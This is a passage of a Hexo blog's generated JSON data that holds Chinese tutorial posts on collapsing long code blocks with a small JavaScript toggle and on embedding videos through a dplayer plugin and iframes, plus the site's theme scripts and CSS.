fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>有些时候经常会遇到博客中很长的代码段，占据半个甚至整个屏幕，此时就非常需要将代码段进行折叠，以此来缓解代码块影响阅读的问题。</p>\n<p>配置走起！</p>","more":"<h3 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h3><ol>\n<li>取消注释</li>\n</ol>\n<p>打开<code>themes\\next\\_config.yml</code>文件。<br><kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。<br>取消<code>bodyEnd: source/_data/body-end.njk</code>注释和<code>style: source/_data/styles.styl</code>注释。</p>\n<figure class=\"highlight yml\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">custom_file_path:</span></span><br><span class=\"line\">  <span class=\"comment\">#head: source/_data/head.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#header: source/_data/header.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#sidebar: source/_data/sidebar.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postMeta: source/_data/post-meta.njk</span></span><br><span class=\"line\">  <span class=\"comment\">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">footer:</span> <span class=\"string\">source/_data/footer.swig</span></span><br><span class=\"line\">  <span class=\"attr\">bodyEnd:</span> <span class=\"string\">source/_data/body-end.njk</span></span><br><span class=\"line\">  <span class=\"attr\">variable:</span> <span class=\"string\">source/_data/variables.styl</span></span><br><span class=\"line\">  <span class=\"comment\">#mixin: source/_data/mixins.styl</span></span><br><span class=\"line\">  <span class=\"attr\">style:</span> <span class=\"string\">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>按照<code>style</code>的路径和<code>bodyEnd</code>的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。</li>\n</ol>\n<ul>\n<li>首先添加<code>bodyEnd</code>文件的内容</li>\n</ul>\n<figure class=\"highlight js\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;DOMContentLoaded&quot;</span>, <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 查找所有 div.table-container 元素</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> tableContainers = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&quot;.table-container&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 遍历所有 div.table-container 元素</span></span><br><span class=\"line\">    tableContainers.<span class=\"title function_\">forEach</span>(<span class=\"keyword\">function</span>(<span class=\"params\">tableContainer</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 获取 div.table-container 内的 span 元素数量</span></span><br><span class=\"line\">      <span class=\"keyword\">const</span> spanCount = tableContainer.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&quot;tbody &gt; tr &gt; td.code &gt; pre &gt; span&quot;</span>).<span class=\"property\">length</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">// 检查 span 元素数量是否 &gt;= 11</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (spanCount &gt;= <span class=\"number\">11</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个</span></span><br><span class=\"line\">        <span class=\"keyword\">const</span> prevElement = tableContainer.<span class=\"property\">previousElementSibling</span>;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> figcaption;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> iElement;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!prevElement || prevElement.<span class=\"property\">tagName</span>.<span class=\"title function_\">toLowerCase</span>() !== <span class=\"string\">&quot;figcaption&quot;</span>) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 在 div.table-container 前插入一个 figcaption 元素</span></span><br><span class=\"line\">          figcaption = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&quot;figcaption&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 将 figcaption 插入到 DOM 中</span></span><br><span class=\"line\">          tableContainer.<span class=\"property\">parentNode</span>.<span class=\"title function_\">insertBefore</span>(figcaption, tableContainer);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          figcaption = prevElement;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 创建一个 &lt;i&gt; 标签并添加功能</span></span><br><span class=\"line\">        iElement = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&quot;i&quot;</span>);</span><br><span class=\"line\">        iElement.<span class=\"property\">className</span> = <span class=\"string\">&quot;fas fa-angle-down&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 插入一点空格</span></span><br><span class=\"line\">        iElement.<span class=\"property\">innerHTML</span> = <span class=\"string\">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>;</span><br><span class=\"line\">        figcaption.<span class=\"title function_\">insertBefore</span>(iElement, figcaption.<span class=\"property\">firstChild</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 为 &lt;i&gt; 标签添加点击事件</span></span><br><span class=\"line\">        iElement.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;click&quot;</span>, <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">          <span class=\"comment\">// 切换 tableContainer 的 &quot;code-hidden&quot; 类</span></span><br><span class=\"line\">          tableContainer.<span class=\"property\">classList</span>.<span class=\"title function_\">toggle</span>(<span class=\"string\">&quot;code-hidden&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">// 切换 &lt;i&gt; 标签的类名</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">contains</span>(<span class=\"string\">&quot;fa-angle-down&quot;</span>)) &#123;</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">remove</span>(<span class=\"string\">&quot;fa-angle-down&quot;</span>);</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&quot;fa-angle-right&quot;</span>);</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">remove</span>(<span class=\"string\">&quot;fa-angle-right&quot;</span>);</span><br><span class=\"line\">            iElement.<span class=\"property\">classList</span>.<span class=\"title function_\">add</span>(<span class=\"string\">&quot;fa-angle-down&quot;</span>);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>PS：在代码的第11行，可以按照自己的需要进行设置，当代码超过多少行时，折叠代码的JS生效。</p>\n<ul>\n<li>然后修改<code>style</code>文件内容，在文件的末尾添加：</li>\n</ul>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">/*</span> <span class=\"string\">代码块隐藏</span> <span class=\"string\">*/</span></span><br><span class=\"line\"><span class=\"string\">.code-hidden</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">display:</span> <span class=\"string\">none;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用案例</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">```bash 折叠代码</span><br><span class=\"line\">/* some code */</span><br><span class=\"line\">```</span><br></pre></td></tr></table></figure>\n\n<p>完成的效果就像添加JS代码的代码块一样。</p>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>已经取消注释的文件对应的功能和教程链接。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">文件</th>\n<th align=\"center\">功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">footer</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/FlyLine/\">背景”小飞棍”</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">bodyEnd</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">variable</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-fillet/\">设置圆角</a></strong></td>\n</tr>\n<tr>\n<td align=\"center\">style</td>\n<td align=\"center\"><strong><a href=\"https://nustarain.gitee.io/2023/07/17/BGPic/\">背景图片</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-transparency/\">博客透明度</a><strong>、</strong><a href=\"https://nustarain.gitee.io/2023/09/09/blog-FoldCode/\">折叠代码</a></strong></td>\n</tr>\n</tbody></table>"},{"title":"博客添加视频方法的总结","date":"2023-12-16T09:14:37.000Z","_content":"\n博客添加视频目前我掌握的一共有两种办法，一种是使用 [**hexo-tag-dplayer 插件**](https://github.com/MoePlayer/hexo-tag-dplayer)，这是对于使用 Hexo 用户多出来的一个选项，但是多出来的这个选项，实际体验也不怎么样。\n\n### hexo-tag-dplayer\n\n使用 Hexo-tag-dplayer 可以使用以下代码进行添加视频：\n\n<!-- more -->\n\n```bash\n{% dplayer \n  \"url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\" \n  \"screenshot\" \n  \"loop=false\" \n  \"preload=auto\"\n  \"volume=0.4\"\n  \"id=46190A32F63DFF2CF0A3BB0F3293636C\" \n  \"api=https://api.prprpr.me/dplayer/\" \n  \"addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\" \n%} \n```\n\n唯一需要自己完成的就是关于视频地址的获取，我这里使用的是[酷播云](https://v.cuplayer.com/)，在国内还是比较快的。\n\n但是经过我使用发现，这个插件在网页中第一次加载时加载不出来视频，需要在进入网页后再进行一次刷新，有时候一篇文章看完了都不知道竟然还有一个视频。\n\n[**点击这里，查看效果**](https://nustarain.gitee.io/2023/09/08/tiangangfu/) 视频在最下面，看不到的话，刷新一下。\n\n具体的解决办法我并没有深究，好在发现了另一个办法。\n\n### iframe\n\n除了使用 hexo-tag-dplayer 还有 H5 中的 iframe 标签也不错。可以通过以下代码引入：\n\n```bash\n<iframe style='width: 600px;height: 338px' frameborder='no' allowfullscreen mozallowfullscreen webkitallowfullscreen src='https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085'></iframe>\n```\n\n也是直接替换掉 src 的内容就可以了。\n\n[**点击这里，查看效果**](https://liuxpblog.eu.org/2023/09/06/TianGang/)\n\n### 嵌入代码\n\n嵌入代码这个功能通常是有别的网站提供的，据我所知大部分视频网站都没有这个功能，YouTube 的嵌入代码做的还可以，哔哩哔哩也有，但是非常吝啬，清晰度非常次，必须要求登录，如果要求登录的话，还不如直接去官网登录观看呢。\n\n![嵌入代码](./blog-add-MM/1.png)\n\n```bash\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" \n        scrolling=\"no\" \n        border=\"0\" \n        frameborder=\"no\" \n        framespacing=\"0\" \n        allowfullscreen=\"true\"> \n</iframe>\n```\n\n效果如下：\n\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" \n        scrolling=\"no\" \n        border=\"0\" \n        frameborder=\"no\" \n        framespacing=\"0\" \n        allowfullscreen=\"true\"> \n</iframe>","source":"_posts/blog-add-MM.md","raw":"---\ntitle: 博客添加视频方法的总结\ndate: 2023-12-16 17:14:37\ncategories: 博客搭建\ntags:\n  - 博客美化\n---\n\n博客添加视频目前我掌握的一共有两种办法，一种是使用 [**hexo-tag-dplayer 插件**](https://github.com/MoePlayer/hexo-tag-dplayer)，这是对于使用 Hexo 用户多出来的一个选项，但是多出来的这个选项，实际体验也不怎么样。\n\n### hexo-tag-dplayer\n\n使用 Hexo-tag-dplayer 可以使用以下代码进行添加视频：\n\n<!-- more -->\n\n```bash\n{% dplayer \n  \"url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\" \n  \"screenshot\" \n  \"loop=false\" \n  \"preload=auto\"\n  \"volume=0.4\"\n  \"id=46190A32F63DFF2CF0A3BB0F3293636C\" \n  \"api=https://api.prprpr.me/dplayer/\" \n  \"addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\" \n%} \n```\n\n唯一需要自己完成的就是关于视频地址的获取，我这里使用的是[酷播云](https://v.cuplayer.com/)，在国内还是比较快的。\n\n但是经过我使用发现，这个插件在网页中第一次加载时加载不出来视频，需要在进入网页后再进行一次刷新，有时候一篇文章看完了都不知道竟然还有一个视频。\n\n[**点击这里，查看效果**](https://nustarain.gitee.io/2023/09/08/tiangangfu/) 视频在最下面，看不到的话，刷新一下。\n\n具体的解决办法我并没有深究，好在发现了另一个办法。\n\n### iframe\n\n除了使用 hexo-tag-dplayer 还有 H5 中的 iframe 标签也不错。可以通过以下代码引入：\n\n```bash\n<iframe style='width: 600px;height: 338px' frameborder='no' allowfullscreen mozallowfullscreen webkitallowfullscreen src='https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085'></iframe>\n```\n\n也是直接替换掉 src 的内容就可以了。\n\n[**点击这里，查看效果**](https://liuxpblog.eu.org/2023/09/06/TianGang/)\n\n### 嵌入代码\n\n嵌入代码这个功能通常是有别的网站提供的，据我所知大部分视频网站都没有这个功能，YouTube 的嵌入代码做的还可以，哔哩哔哩也有，但是非常吝啬，清晰度非常次，必须要求登录，如果要求登录的话，还不如直接去官网登录观看呢。\n\n![嵌入代码](./blog-add-MM/1.png)\n\n```bash\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" \n        scrolling=\"no\" \n        border=\"0\" \n        frameborder=\"no\" \n        framespacing=\"0\" \n        allowfullscreen=\"true\"> \n</iframe>\n```\n\n效果如下：\n\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" \n        scrolling=\"no\" \n        border=\"0\" \n        frameborder=\"no\" \n        framespacing=\"0\" \n        allowfullscreen=\"true\"> \n</iframe>","slug":"blog-add-MM","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5eu004a7zj35pg83931","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>博客添加视频目前我掌握的一共有两种办法，一种是使用 <a href=\"https://github.com/MoePlayer/hexo-tag-dplayer\"><strong>hexo-tag-dplayer 插件</strong></a>，这是对于使用 Hexo 用户多出来的一个选项，但是多出来的这个选项，实际体验也不怎么样。</p>\n<h3 id=\"hexo-tag-dplayer\"><a href=\"#hexo-tag-dplayer\" class=\"headerlink\" title=\"hexo-tag-dplayer\"></a>hexo-tag-dplayer</h3><p>使用 Hexo-tag-dplayer 可以使用以下代码进行添加视频：</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% dplayer </span><br><span class=\"line\">  <span class=\"string\">&quot;url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;screenshot&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;loop=false&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;preload=auto&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;volume=0.4&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;id=46190A32F63DFF2CF0A3BB0F3293636C&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;api=https://api.prprpr.me/dplayer/&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441&quot;</span> </span><br><span class=\"line\">%&#125; </span><br></pre></td></tr></table></figure>\n\n<p>唯一需要自己完成的就是关于视频地址的获取，我这里使用的是<a href=\"https://v.cuplayer.com/\">酷播云</a>，在国内还是比较快的。</p>\n<p>但是经过我使用发现，这个插件在网页中第一次加载时加载不出来视频，需要在进入网页后再进行一次刷新，有时候一篇文章看完了都不知道竟然还有一个视频。</p>\n<p><a href=\"https://nustarain.gitee.io/2023/09/08/tiangangfu/\"><strong>点击这里，查看效果</strong></a> 视频在最下面，看不到的话，刷新一下。</p>\n<p>具体的解决办法我并没有深究，好在发现了另一个办法。</p>\n<h3 id=\"iframe\"><a href=\"#iframe\" class=\"headerlink\" title=\"iframe\"></a>iframe</h3><p>除了使用 hexo-tag-dplayer 还有 H5 中的 iframe 标签也不错。可以通过以下代码引入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe style=<span class=\"string\">&#x27;width: 600px;height: 338px&#x27;</span> frameborder=<span class=\"string\">&#x27;no&#x27;</span> allowfullscreen mozallowfullscreen webkitallowfullscreen src=<span class=\"string\">&#x27;https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085&#x27;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>\n\n<p>也是直接替换掉 src 的内容就可以了。</p>\n<p><a href=\"https://liuxpblog.eu.org/2023/09/06/TianGang/\"><strong>点击这里，查看效果</strong></a></p>\n<h3 id=\"嵌入代码\"><a href=\"#嵌入代码\" class=\"headerlink\" title=\"嵌入代码\"></a>嵌入代码</h3><p>嵌入代码这个功能通常是有别的网站提供的，据我所知大部分视频网站都没有这个功能，YouTube 的嵌入代码做的还可以，哔哩哔哩也有，但是非常吝啬，清晰度非常次，必须要求登录，如果要求登录的话，还不如直接去官网登录观看呢。</p>\n<p><img src=\"/2023/12/16/blog-add-MM/1.png\" alt=\"嵌入代码\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe src=<span class=\"string\">&quot;//player.bilibili.com/player.html?aid=922182547&amp;bvid=BV1Uu4y1u7NQ&amp;cid=1364298943&amp;p=1&quot;</span> </span><br><span class=\"line\">        scrolling=<span class=\"string\">&quot;no&quot;</span> </span><br><span class=\"line\">        border=<span class=\"string\">&quot;0&quot;</span> </span><br><span class=\"line\">        frameborder=<span class=\"string\">&quot;no&quot;</span> </span><br><span class=\"line\">        framespacing=<span class=\"string\">&quot;0&quot;</span> </span><br><span class=\"line\">        allowfullscreen=<span class=\"string\">&quot;true&quot;</span>&gt; </span><br><span class=\"line\">&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>\n\n<p>效果如下：</p>\n<iframe src=\"//player.bilibili.com/player.html?aid=922182547&bvid=BV1Uu4y1u7NQ&cid=1364298943&p=1\" scrolling=\"no\" border=\"0\" frameborder=\"no\" framespacing=\"0\" allowfullscreen=\"true\"> \n</iframe>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>博客添加视频目前我掌握的一共有两种办法，一种是使用 <a href=\"https://github.com/MoePlayer/hexo-tag-dplayer\"><strong>hexo-tag-dplayer 插件</strong></a>，这是对于使用 Hexo 用户多出来的一个选项，但是多出来的这个选项，实际体验也不怎么样。</p>\n<h3 id=\"hexo-tag-dplayer\"><a href=\"#hexo-tag-dplayer\" class=\"headerlink\" title=\"hexo-tag-dplayer\"></a>hexo-tag-dplayer</h3><p>使用 Hexo-tag-dplayer 可以使用以下代码进行添加视频：</p>","more":"<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% dplayer </span><br><span class=\"line\">  <span class=\"string\">&quot;url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;screenshot&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;loop=false&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;preload=auto&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;volume=0.4&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;id=46190A32F63DFF2CF0A3BB0F3293636C&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;api=https://api.prprpr.me/dplayer/&quot;</span> </span><br><span class=\"line\">  <span class=\"string\">&quot;addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441&quot;</span> </span><br><span class=\"line\">%&#125; </span><br></pre></td></tr></table></figure>\n\n<p>唯一需要自己完成的就是关于视频地址的获取，我这里使用的是<a 